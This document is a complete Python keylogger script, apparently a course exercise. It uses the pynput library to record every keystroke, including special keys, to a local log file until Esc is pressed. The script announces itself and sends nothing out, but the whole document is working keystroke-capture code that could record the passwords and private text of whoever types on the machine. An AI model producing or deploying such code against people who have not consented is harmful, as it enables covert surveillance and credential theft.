from pynput import keyboard

log_file = "CS_04.log"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            if key == keyboard.Key.enter:
                f.write("[Enter]\n")
            elif key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.tab:
                f.write("[Tab]")
            elif key == keyboard.Key.backspace:
                f.write("[Backspace]")
            elif key == keyboard.Key.delete:
                f.write("[Delete]")
            elif key == keyboard.Key.shift:
                f.write("[Shift]")
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                f.write("[Ctrl]")
            elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
                f.write("[Alt]")
            elif key == keyboard.Key.esc:
                f.write("[Esc]")
            elif isinstance(key, keyboard.KeyCode):  # Check if it's a regular character Key
                f.write(key.char)
            else:
                f.write(f"[{key}]")
    except Exception as e:
        print(f'Error writing to file: {e}')

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        print("Esc key pressed. Exiting.")  # Debugging information
        return False

if __name__ == "__main__":
    print("Starting keylogger...")  # Debugging information
    with open(log_file, 'w') as f:  # Clear the log file at the start
        f.write("Starting keylogger...\n")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    print("Keylogger stopped.")  # Debugging information
